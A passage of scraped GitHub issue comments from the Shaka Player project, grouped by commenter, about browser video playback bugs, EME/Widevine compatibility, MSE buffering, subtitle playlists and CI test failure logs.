NETWORK.HTTP_ERROR (https://d1g1aamoxberjq.cloudfront.net/dash/sintel-1-audio.mp4)\". @ckelsey, your manifests play correctly for me with both the Shaka and DASH-IF players in Firefox 50 and 53 (Nightly) and Chrome on macOS 10.12.. Interesting. I can reproduce the video stall and error in Firefox and Safari now. The video plays in Chrome and Edge, though Edge logs a console error.\nIn Firefox 50 and 53 (Nightly) on macOS 10.12 and Windows 10, I see:\nThe last segment should not end before the end of the Period.\nObject { position: 73, startTime: 885.7083333333334, endTime: 888,\ngetUris: shaka.media.Mp4SegmentIndexParser/<(), startByte: 414991746, endByte: 415018384 }\nIn Safari on macOS 10.12, I see:\nThe last segment should not end before the end of the Period.\nSegmentReference\nendByte: 415018384\nendTime: 888\ngetUris: function()\nposition: 73\nstartByte: 414991746\nstartTime: 885.7083333333334\nIn Edge, I see the following console error, though the video still plays correctly!\n\"The last segment should not end before the end of the Period.\"\n[object Object]{endByte: 415018384, endTime: 888, position: 73,\nstartByte: 414991746, startTime: 885.70833333...\"}. @MegaLabs1, can you share a link to a test manifest that reproduces the Firefox problem?. @MegaLabs1: What is the custom license server I can use for the Shaka Player Demo page?. The video doesn't play for me in Chrome or Firefox on macOS. (I haven't tested Windows yet.) I see the following errors in both the Chrome and Firefox devtools console:\nThe last segment should not end before the end of the Period. Object { position: 141, startTime: 420, endTime: 420.08, getUris: function bound (), startByte: 0, endByte: null }mpd_utils.js:332:5\nThe last segment should not end before the end of the Period. Object { position: 141, startTime: 420, endTime: 420.08, getUris: function bound (), startByte: 0, endByte: null }mpd_utils.js:332:5\nThe last segment should not end before the end of the Period. Object { position: 141, startTime: 420, endTime: 420.08, getUris: function bound (), startByte: 0, endByte: null }mpd_utils.js:332:5\nThe last segment should not end before the end of the Period. Object { position: 141, startTime: 420, endTime: 420.08, getUris: function bound (), startByte: 0, endByte: null }mpd_utils.js:332:5\nThe last segment should not end before the end of the Period. Object { position: 141, startTime: 420, endTime: 420.08, getUris: function bound (), startByte: 0, endByte: null }mpd_utils.js:332:5. In both Chrome and Firefox on Windows 10, I see some audio and video segments network requests in devtools, but no video plays. After a few seconds, Shaka throws a DRM.LICENSE_REQUEST_FAILED error saying \"Shaka Error NETWORK.HTTP_ERROR\".\n. @jyavenard: In Firefox 50 - Aurora 52, this stream stalls at time 0:09 (or sometimes 0:29), but in Nightly 54, it stalls at 0:02. IIUC Firefox will skip gap shorter than 200 ms, but the comments above say the gap is just 80 ms. Could this being a Widevine stream affect Firefox's gap skipping logic?\n@cpearce: After Firefox bug 1324925 landed in Nightly 53, this video stops with the following error message in the devtools console. Was this EME error happening before and just wasn't being logged?\nAssertion failed: Key status change for inactive session! drm_engine.js:1045:3. I commented in the Firefox bug 1357133. Firefox's Widevine CDM process is crashing.. Firefox has code to support audioRobustness: \"SW_SECURE_CRYPTO\" and videoRobustness: \"SW_SECURE_DECODE\" (not SW_SECURE_CRYPTO here).\n@cpearce, is that correct? I see Firefox has code to check for these robustness strings but no tests.. The Angel One asset plays correctly for me in Firefox 53 on macOS 10.12 and Windows 10, but I can reproduce the \"Shaka Error MANIFEST.UNPLAYABLE_PERIOD ()\" error with the Car ClearKey asset. I don't think this error is a Firefox regression because I can reproduce the Car ClearKey error even in Firefox 45 from 2016-03-08.. > The issue with \"Car ClearKey\" appears to be a bug in the content's manifest. They use \"mp4a.40.02\" instead of \"mp4a.40.2\". Chrome accepts both, but Firefox only accepts the latter.\nThanks. I filed Firefox bug 1373314 for this issue.\n\nWith \"Angel One ... ClearKey server\", I get different results from either of you. For me, the content loads, then starts showing decode errors at 11 seconds:\n\nWhat OS and Firefox version are you testing?\n\nThe Widevine version of the same works in Chrome, but fails in Firefox:\n\nI was able to reproduce a playback error in Firefox 53, but not in Firefox 54 released this week. However, the error looked like it was related to IndexedDB versioning, which might have been caused because I used the same Firefox user profile in a newer Firefox version before jumping back to Firefox 53.\n\nchrome:media-internals\n\nYou can install the about:media Firefox extension.. This bug is fixed in Firefox 56.. Note that Mozilla updated the Widevine CDM to version 1.4.8.970 in Firefox Beta 56 (Firefox bug 1380175) and version 1.4.8.984 in Firefox Nightly 57 (Firefox bug 1383611). That wouldn't affect Firefox 54 or 55 unless these video streaming services have already started requiring a Widevine version before it is available in the Firefox Release channel.. I bisected this regression to @jyavenard's fix for Firefox bug 1382303. That was a fix for a BBC Player autoplay bug. I filed Firefox bug 1389844 to track this new regression in Firefox 55.\nNote that the BBC autoplay fix was uplifted/backported to the Extended Support Release (ESR) version of Firefox 52, which will continue to receive security fixes until 2018 Q1. If you need to add a workaround for Firefox 55+, you should also enable the workaround for Firefox 52. Even though there is no programmatic way to distinguish ESR Firefox 52 (with the BBC fix) from regular Firefox 52 (without the BBC fix), you can safely assume that anyone visiting your website with Firefox 52 is using the ESR version. Anyone using the regular version of Firefox should have been updated to a newer version months ago.. I see \"Shaka Error NETWORK.HTTP_ERROR (https://nginx.dev.cdnnow.ru/live/3466666.m4a)\" in both Firefox 56.0.1 and Chrome 62. In the devtools console, I see CORS network errors:\nCross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://nginx.dev.cdnnow.ru/live/3675000.m4v. (Reason: CORS header \u2018Access-Control-Allow-Origin\u2019 missing).\nCross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://nginx.dev.cdnnow.ru/live/3675000.m4a. (Reason: CORS header \u2018Access-Control-Allow-Origin\u2019 missing).\nCross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://nginx.dev.cdnnow.ru/live/3675000.m4v. (Reason: CORS header \u2018Access-Control-Allow-Origin\u2019 missing).\n(video:1) failed fetch and append: code=1002. @cpearce, I can reproduce this Shaka Widevine failure in Firefox 56+ on Windows 10. It works in Chrome.\nI see the following EME errors in the browser console (Ctrl+Shift+J), but I don't see any errors in the devtools console (Ctrl+Shift+K):\nMediaKeySystemAccess::GetKeySystemStatus(org.w3.clearkey) result=available msg=''\nMediaKeySystemAccess::GetKeySystemStatus(com.widevine.alpha) result=available msg=''\nnavigator.requestMediaKeySystemAccess promise rejected 0x80530009 'Key system is unsupported'. > The content fails to play on FF 59 and up, with Error Code: NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) Details: void __cdecl mozilla::EMEDecryptor::AttemptDecode(class mozilla::MediaRawData ): Failed to convert encrypted AAC sample to ADTS.\nI think this is Firefox bug 1447821. A fix should land in Firefox Nightly this week. I expect the fix will ship in Firefox 60 (May 9). If this affects a lot of content, please comment in the Firefox bug and we might be able to patch this bug in a Firefox 59.0.3 dot release sooner. Until the fix ships, you could try not encrypting the audio content.. ",
    "cpearce": "I work on Firefox's EME and media stacks. We only support EME in MP4.\nTo get Linux MP4 support you need to have the appropriate ffmpeg packages installed and must ensure the following prefs have the following values in about:config: \nmedia.fragmented-mp4.ffmpeg.enabled=true\nmedia.fragmented-mp4.exposed=true\nmedia.mediasource.whitelist=false\nDavid Dorwin pointed out that this demo also fails in Firefox because  MediaKeySystemAccess.prototype.getConfiguration does not exist. Currently we haven't implemented that, and I'm not sure when we'll get to it.\nWe support configuration discovery by providing a configuration list to navigator.requestMediaKeySystemAccess().\nWe support this WebIDL:\nhttps://dxr.mozilla.org/mozilla-central/source/dom/webidl/MediaKeySystemAccess.webidl\nCurrently only the initDataType capability, audioType and videoType MediaKeySystemOptions fields are handled by our implementation. The optional fields are ignored, and we don't support any configurations that specify an audioCapability or videoCapability.\n. From tomorrow onwards, Firefox Nightly (version 50) should support the persistentState attribute. Please re-test in an up-to-date Firefox Nightly build tomorrow, and let me know whether that works.\n. Thanks for reporting this bug @karlovich. I work on EME in Firefox. I've asked some questions in the Firefox bug to help me debug this.\nWe're committed to fixing this.\n@olivbraun Do you mostly see this the first time you try loading a page in Firefox, or consistently? When you see this, if you open Hamburger Menu > Add-on > Plugins, does the \"Widevine Content Decryption Module\" entry show that the Widevine plugin is installed? \nI'm wondering if the CDM hasn't had enough time to download yet.\n. @olivbraun:\n\nI tested both FF 47.0.1 and Nightly, and noticed that Widevine CDM is reinstalled whenever I switch from one version to the other.\n\nI'd guess you have a 64bit Firefox Nightly, and a 32bit Firefox 47.0.1? We reinstall when the arch changes (32 vs 64 bit).\n\nIf I wait until the plugin is installed and then run the script above, it works fine and tells me \"Created cdm\". If I don't wait and run the script while the plugin is not yet installed, I get a message saying that Firefox is currently installing a required component, but then when I refresh the page a few seconds later it works fine.\n\nI'm also guessing your Nightly has multi-process Firefox enabled. :)\nThis sounds like bug 1288976 which should be fixed in tomorrow's Nightly build onwards. Try updating your Nightly tomorrow, and re-testing. You can update your Nightly in Hamburger menu > ? > About Firefox.\n. @olivbraun do you still have issues with an up to date release version of Firefox (version 49). A lot of the issues here should be fixed now.\nThe issues @karlovich was having are much harder to solve. We're still looking into those.\n. @joeyparrish we ony enable WebM in MSE if the client machine passes our \"benchmark\" test, that is, if we judge the machine can adequately decode 720p VP9 in software \"fast enough\". I'd expect @Ajaay's machine has not passed our benchmark for some reason.\nWebM can be force enabled by setting media.mediasource.webm.enabled=true in about:config.\nOnce we get hardware decoding for VP9, I expect we'll remove the benchmark.\n. Firefox doesn't recognize \"SW_SECURE_CRYPTO\" with video; it assumes you'll always want \"SW_SECURE_DECODE\". I didn't realize Chrome accepted both when I implemented Firefox's support. I'll add \"SW_SECURE_CRYPTO\" to the list of robustness values that Firefox recognizes for video.. Patch up in Firefox bug 1363605. I expect we'll ship this fix in Firefox 55 around 2017-08-08.. @Ross-cz The fix to make Firefox support SW_SECURE_CRYPTO on video configurations is only in Firefox Nightly, it's not in Release or Beta Firefox yet.\nWith your test I get 5 supported configurations in Firefox Nightly 55, which will ship to our Release users on around 8 August.\nIf you replaced SW_SECURE_CRYPTO with SW_SECURE_DECODE on the video configs, you'd find it worked in both Chrome and Firefox.. Thanks for reporting this. I can also repro on Linux. I've filed Mozilla Bug 1409988 to track fixing this in Firefox.. I think this may be fixed in Firefox Nightly buy Mozilla bug, but the test URL  https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://nginx.dev.cdnnow.ru/live/index.mpd;license=https://one.drmnow.ru/widevine;lang=en-US no longer works in Firefox or Chrome for that matter.\n@gleb-shchavlev are you able to either download and test Firefox Nightly on your content, or provide a URL to content that we can test with? That will help us confirm whether this issue is fixed or not. Thanks!. ",
    "jyavenard": "Throwing an invalid state error when setting currentTime is per spec.\nThis is what I wrote in the Firefox bug created for this:\nhttp://dev.w3.org/html5/spec-preview/media-elements.html#offsets-into-the-media-resource\nThrow an InvalidStateError if there is no selected Media Resource.\nWhen the video/media element is created, and no mediasource has been created and attached it doesn't have a selected media resource yet.\n. Ok... I went by the first post description that did \"document.createElement('video').currentTime = 0\".\nThen you're hitting https://bugzilla.mozilla.org/show_bug.cgi?id=1188887\nI had put it on a back burner, I'll bump it\n. This caused regression #569 \n. 2ecd8bba19c668a2078da1ab402cdfcd53f45ad5 is the first bad commit\ncommit 2ecd8bba19c668a2078da1ab402cdfcd53f45ad5\nAuthor: Joey Parrish joeyparrish@google.com\nDate:   Wed Oct 19 13:07:47 2016 -0700\n```\nFlush Chromecast pipeline after clearing buffer\nTo work around a bug in Chromecast, seek after clearing the buffer.\nThis forces the device to flush the pipeline and remove any decoded\ndata from the old representation.\nCloses #544\nChange-Id: I3c34d344bfd856b429a360fc41ce7288791716bb\n```\n. Here is a quick fix. I'm not familiar with shaka code so it may not be how you would have done it.\nThe issue at hand here is that the media pipeline is flushed when a seek is initiated. However, this flushing is done by seeking again. So you get something like seek -> clear -> flush (seek) -> seek -> clear -> flush (seek) -> repeat\nThe current code is racy in such that it relies on an event (seeking/seeked) be fired in a specific order, order not defined in the spec.\nSo the work around is to not attempt to clear the media pipeline while we're seeking. It's more efficient that way anyway as when you're seeking there's no need to flush the pipeline (it's already been flushed). This will speed up seeking on all user agents.\nIt fixes the issue mentioned by @cpeterso above with Safari slightly, but there's still something wrong there. Sometimes after seeking it displayed the Halloween message until you pause and play again. But this appears to be irrelevant of 2.0.0 vs 2.0.1\n. The link was above: https://github.com/jyavenard/shaka-player/commit/23107549d26b4b93da2b2414bd318c51f7fb9164\nWill do a PR\n. @joeyparrish  I agree... The original work around looks like a dirty hack to me :)\nIn any case, seeking in the middle of another seek and to a different time no less, ought to break things. Especially when there are event handlers in the process.\n. @cpeterso No. this has nothing to do with MSE. MSE never performs any networking access. MSE is all about buffer management.. @cpeterso No. this has nothing to do with MSE. MSE never performs any networking access. MSE is all about buffer management.. I have responded to the bugzilla entry. The change found in Firefox 55 and not present in 54 is related to the handling of autoplay attribute and when playback would actually start (that is when the play and playing events would be fired).\nIn FF 54, playing would have been incorrectly fired immediately, even with readyState equal to HAVE_NOTHING. Per spec, playing should only be fired if readyState is greater or equal to HAVE_FUTURE_DATA.\nWhile I haven't actually checked on the code that no longer work, it indicates to me that the player incorrectly waits on the playing or play event to be fired to perform a particular action.\nplay will only be fired if\n\n\nplay() is called or\n\n\nif the autoplay attribute is set and \"the autoplay attribute has caused playback to begin.\"\n(https://html.spec.whatwg.org/multipage/media.html#event-media-play)\n\n\nThe autoplay attribute is to start playback when \nhttps://html.spec.whatwg.org/multipage/media.html#ready-states\n\nIf the new ready state is HAVE_ENOUGH_DATA\n    If the autoplaying flag is true, and the paused attribute is true, and the media element has an autoplay attribute specified, and the media element's Document's active sandboxing flag set does not have the sandboxed automatic features browsing context flag set, then the user agent may also set the paused attribute to false, queue a task to fire a simple event named play, and queue a task to fire a simple event named playing.\n\nWith MSE, we consider that we have enough data (readyState will move to HAVE_ENOUGH_DATA) if the source buffer contains more than 10s of continuous data (with a fuzz of +- 500ms, that is any gaps in the data lesser than 500ms are ignored)\nSo the solution here is add more than 10s of data, not wait on the playing event or manually call play()\nAdding more than 10s of data, is I believe the best approach, as it pretty much guarantees playback won't stall later. @joeyparrish wrote:\n\nIn Firefox 55, while the video is not playing, I see 15 seconds of video buffered. playbackRate is 1, paused is true. If I run video.play() in the console, playback starts.\n\nHmmm. That shouldn't be. 15s is more than enough.\nPlease provide me a way to reproduce the problem, thank you. I have written mochitest to check on the behaviour should more than 10s data be loaded, the canplay, play and playing events are always fired as soon as the sourcebuffer contains more than 10s of video data.. reproduced it, it's because the data doesn't start at 0 but 0.08s.... . IssueS (there were two) have been fixed in Firefox Nightly 57, uplift for 56 and ESR 52 have been requested.\nThank you for reporting the issue.\nthis bug can be closed. ",
    "revtechbhav": "is any way to resolve the \nFailed to set referrer policy: The value 'origin-when-cross-origin' is not one of 'no-referrer', 'origin', 'no-referrer-when-downgrade', or 'unsafe-url'. Defaulting to 'no-referrer'. \nissue \nit is coming in my safari mac browser, and is working fine rest of browsers\n. ",
    "dougdoe": "Hi, my team is watching this issue. I have a couple of questions that I hope you can answer to help me plan:\n1. Are you implementing TTML 1 or TTML 2 support? I don't see references to TTML 2, so I assume you are following the TTML 1 Specification. Is that right?\n2. Does this work include support for chunked TTML for Live streams?\n. Note: We require this behaviour to be able to late-bind Closed Captions to a stream. This is a side effect of existing content we already have ingested. We receive the MPD and WebVTT URLs separately, so we would like to be able to attach a WebVTT URL to the content.\n. We will have both the MPD and subtitle URL(s) prior to playback, so for our purposes your suggestion would be appropriate. In terms of priority, this is high priority for us \u2013\u00a0if needed, perhaps @sanbornhnewyyz can work with you on it.\nThanks!\n. Sounds good. We can give it a try when we see the commit go through. Thanks.\n. We have also determined that the WebVTT URLs that we are receiving are in the form of a playlist, which contains multiple .vtt files. Thus, we will have one playlist for each language (e.g. one playlist for English, one for Spanish, one for French).\nApologies for these lack of details. I can send you an example playlist via email, if it helps. Let me know. \n. Yes, I believe the playlists are standard format. An example is below. Each playlist contains many .vtt files for a single language. \n```\nEXTM3U\nEXT-X-VERSION:3\nEXT-X-TARGETDURATION:9\nEXTINF:9.0,\nsub000000.vtt\nEXTINF:7.2,\nsub000001.vtt\nEXTINF:9.0,\nsub000002.vtt\nEXTINF:7.2,\nsub000003.vtt\nEXTINF:9.0,\nsub000004.vtt\nEXTINF:7.2,\nsub000005.vtt\nEXTINF:9.0,\nsub000006.vtt\nEXTINF:7.2,\nsub000007.vtt\nEXTINF:9.0,\nsub000008.vtt\nEXTINF:8.8,\nsub000009.vtt\nEXTINF:9.0,\nsub000010.vtt\nEXTINF:8.0,\nsub000011.vtt\nEXTINF:9.0,\nsub000012.vtt\nEXTINF:7.2,\nsub000013.vtt\nEXTINF:9.0,\nsub000014.vtt\nEXTINF:7.2,\nsub000015.vtt\nEXTINF:9.0,\nsub000016.vtt\nEXTINF:7.2,\nsub000017.vtt\nEXTINF:9.0,\nsub000018.vtt\nEXTINF:8.9,\nsub000019.vtt\nEXTINF:9.0,\nsub000020.vtt\nEXTINF:7.2,\nsub000021.vtt\nEXTINF:9.0,\nsub000022.vtt\nEXTINF:8.8,\nsub000023.vtt\nEXTINF:9.0,\nsub000024.vtt\nEXTINF:7.2,\nsub000025.vtt\nEXTINF:9.0,\nsub000026.vtt\nEXTINF:7.2,\nsub000027.vtt\nEXTINF:9.0,\nsub000028.vtt\nEXTINF:7.2,\nsub000029.vtt\nEXTINF:9.0,\nsub000030.vtt\nEXTINF:7.2,\nsub000031.vtt\nEXTINF:9.0,\nsub000032.vtt\nEXTINF:7.2,\nsub000033.vtt\nEXTINF:9.0,\nsub000034.vtt\nEXTINF:7.2,\nsub000035.vtt\nEXTINF:9.0,\nsub000036.vtt\nEXTINF:7.5,\nsub000037.vtt\nEXTINF:9.0,\nsub000038.vtt\nEXTINF:7.2,\nsub000039.vtt\nEXTINF:9.0,\nsub000040.vtt\nEXTINF:7.2,\nsub000041.vtt\nEXTINF:9.0,\nsub000042.vtt\nEXTINF:7.2,\nsub000043.vtt\nEXTINF:9.0,\nsub000044.vtt\nEXTINF:6.3,\nsub000045.vtt\nEXT-X-ENDLIST\n```\n. Thanks, this seems like a reasonable short-term strategy. I think the only outstanding question for this issue now is from @sanbornhnewyyz above. He indicates:\n\nIf I call addExternalCaptions() multiple times then only the last one will get used.\nI wouldn't be able to add say, a french and an english track. Is that correct?\n\nIs this right, or is he not using the API correctly?\n. @tdrews Is it possible to plan to include your [potential] fix in v1.5.0?\n. Hi @tdrews, I'm just wondering if you are planning to move forward with the suggestions mentioned above? If so, is it possible to assign and set a milestone, assuming you have one in mind? (We have an outstanding issue on our side that I'm attempting to organize.)\nAlso, is there any suggested workaround in the meantime? Thanks.\n. Hi Joey, reading over your latest update, I'm not sure this is sufficient. We are planning on using EMSG box for the following:\n1. ID3 tags \u2013\u00a0ID3 tags will be inserted into EMSG box and when detected by the player, we will need to take action\n2. Dynamic Ad Insertion\nIn both cases, I believe we will need EMSG events to be dispatched from the player. Does this make sense?\n. Hi @joeyparrish I am about to send you an email with two documents that contain information on EMSG box and ID3 tags.\n. Quickplay has a lot of interest in this feature, so we would be willing work early development branches or beta quality, if possible. Specifically, this is for supporting Closed Captions for live content, which will be provided to us as segmented TTML.\n. Hi @joeyparrish and @ismena, I am wondering if you have an estimate for when this work will be ready for a pull request. I am attempting to do some planning, so if you have any information, it would be helpful. My team can also help perform testing when there is something to work with. Thanks.. ",
    "ruiposse": "Unfortunately I cannot. All content is behind an authentication system.\nSorry about that. I know it's not very useful, but I'm pretty sure it happens with any manifest with more than one audio.\n. ",
    "vasanthap": "https://w3c.github.io/encrypted-media/#widl-MediaKeySession-keyStatuses\n. The correct link is: https://w3c.github.io/encrypted-media/#idl-def-MediaKeyStatus\n. Looks like this is already implemented in shaka player: https://github.com/google/shaka-player/blob/master/lib/media/eme_manager.js#L539\n. I actually tested this scenario a while back, we had a good reason why we thought the behavior was expected (sorry I cannot remember it now) and that is why delay was added to these tests. \nWith that having said, I like your suggestion. If you implement that, please add/update integration test for the scenario.\n. ",
    "natalieharris": "I'm not sure if this is what you are looking for. This checks for error key statuses and dispatches an error event if one is found. The ability to query the current keyStatuses does not exist. \n. ",
    "FrankGalligan": "John if I try to pull the webm content from the BaseURL in the mpd I get 404's. Are the permissions on webm files set correctly?\n. ",
    "shaka-bot": "Testing in progress...\n. Testing in progress...\n. Errors:\n```\n+ ./build/all.sh\n./build/../build/../lib/player/player.js:267: ERROR - Property video_ never defined on this\n  if (this.video_.autoplay) {\n      ^\n./build/../build/../lib/player/player.js:275: ERROR - Property adaptationEnabled_ never defined on this\n  videoSource.enableAdaptation(this.adaptationEnabled_);\n                               ^\n2 error(s), 0 warning(s), 98.0% typed\n```\n. Testing in progress...\n. Failed to parse test results\n. Testing in progress...\n. Failure:\n+ ./build/all.sh\n0 error(s), 0 warning(s), 98.1% typed\n108 files checked, no errors found.\n+ test -e karma.conf.js\n+ xvfb-run karma start --single-run --no-colors --reporters junit,dots --browsers Chrome\n..........................................................................\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment duration template plays two full segments of content FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:153:9\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment duration template returns to seek range when seeking before start FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:297:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment duration template returns to end of seek range when after end FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:332:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment number template requests MPD update in expected time FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:260:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment number template returns to seek range when seeking before start FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:297:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment number template returns to end of seek range when after end FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:332:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment number template corrects a timestamp that is behind FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:237:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment number template corrects a timestamp that is ahead FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:237:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment time template requests MPD update in expected time FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:260:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment time template returns to seek range when seeking before start FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:297:7\nChrome 43.0.2357 (Linux 0.0.0) Player live support for segment time template returns to end of seek range when after end FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:332:7\n...................................................................\nChrome 43.0.2357 (Linux 0.0.0) Player load can be used multiple times without EME FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:123:9\nChrome 43.0.2357 (Linux 0.0.0) Player load can be used multiple times with EME FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:143:9\nChrome 43.0.2357 (Linux 0.0.0) Player selectVideoTrack can set resolution before beginning playback FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:174:9\nChrome 43.0.2357 (Linux 0.0.0) Player selectVideoTrack can be called multiple times FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:198:9\nChrome 43.0.2357 (Linux 0.0.0) Player seek does not lock up on segment boundaries FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:232:9\nChrome 43.0.2357 (Linux 0.0.0) Player seek does not create unclosable gaps in the buffer FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:264:9\nChrome 43.0.2357 (Linux 0.0.0) Player seek does not hang when seeking to evicted data FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:329:9\nChrome 43.0.2357 (Linux 0.0.0) Player seek does not hang when seeking to pre-adaptation data FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:364:9\nChrome 43.0.2357 (Linux 0.0.0) Player seek can be used during stream switching FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:387:9\nChrome 43.0.2357 (Linux 0.0.0) Player seek fires an event when seeking by zero  FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:413:9\nChrome 43.0.2357 (Linux 0.0.0) Player enableTextTrack enables the active track FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:431:9\nChrome 43.0.2357 (Linux 0.0.0) Player selectTextTrack activates the correct track FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:454:9\nChrome 43.0.2357 (Linux 0.0.0) Player selectTextTrack does not disable subtitles FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:479:9\nChrome 43.0.2357 (Linux 0.0.0) Player selectTextTrack does not re-enable subtitles FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:504:9\nChrome 43.0.2357 (Linux 0.0.0) Player setPlaybackRate plays faster for rates above 1 FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:526:9\nChrome 43.0.2357 (Linux 0.0.0) Player setPlaybackRate plays in reverse for negative rates FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:546:9\nChrome 43.0.2357 (Linux 0.0.0) Player getStats updates playTime FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:566:9\nChrome 43.0.2357 (Linux 0.0.0) Player setPreferredLanguage changes the default tracks FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:599:9\nChrome 43.0.2357 (Linux 0.0.0) Player setPreferredLanguage enables text tracks when no matching audio is found FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:615:9\nChrome 43.0.2357 (Linux 0.0.0) Player setPreferredLanguage disables text tracks when matching audio is found FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:631:9\nChrome 43.0.2357 (Linux 0.0.0) Player setRestrictions ignores video tracks above the maximum height FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:655:9\nChrome 43.0.2357 (Linux 0.0.0) Player setRestrictions ignores video tracks above the maximum width FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:677:9\nChrome 43.0.2357 (Linux 0.0.0) Player setRestrictions takes effect before the source is loaded FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:703:9\nChrome 43.0.2357 (Linux 0.0.0) Player interpretContentProtection calls the license post-processor FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:740:9\nChrome 43.0.2357 (Linux 0.0.0) Player interpretContentProtection calls the license pre-processor FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:768:9\n.....\nChrome 43.0.2357 (Linux 0.0.0) Player plays VP9 WebM FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:830:7\nChrome 43.0.2357 (Linux 0.0.0) Player dispatches errors on failure FAILED\n    Expected false to be true.\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:844:39\nChrome 43.0.2357 (Linux 0.0.0) Player respects autoplay=true FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:859:7\nChrome 43.0.2357 (Linux 0.0.0) Player respects autoplay=false FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:874:7\nChrome 43.0.2357 (Linux 0.0.0) Player does not count buffering on startup FAILED\n    Failed: foo\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:922:7\n................................\nChrome 43.0.2357 (Linux 0.0.0): Executed 219 of 219 (41 FAILED) (9.36 secs / 9.239 secs)\n. Testing in progress...\n. Failure:\n+ ./build/all.sh\n0 error(s), 0 warning(s), 98.1% typed\n108 files checked, no errors found.\n+ test -e karma.conf.js\n+ xvfb-run karma start --single-run --no-colors --reporters junit,dots --browsers Chrome\n................................................................................\n..............................................................................\nChrome 43.0.2357 (Linux 0.0.0) Player seek does not hang when seeking to evicted data FAILED\n    Expected 0 to be greater than 0.\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/player_integration.js:316:53\n........................WARN [web-server]: 404: /base/assets/does_not_exist\nWARN [web-server]: 404: /base/assets/does_not_exist\nWARN [web-server]: 404: /base/assets/does_not_exist\n....................................\nChrome 43.0.2357 (Linux 0.0.0): Executed 219 of 219 (1 FAILED) (2 mins 1.917 secs / 2 mins 1.823 secs)\n. Testing in progress...\n. Failure:\n+ ./build/all.sh\n0 error(s), 0 warning(s), 98.1% typed\n108 files checked, no errors found.\n+ test -e 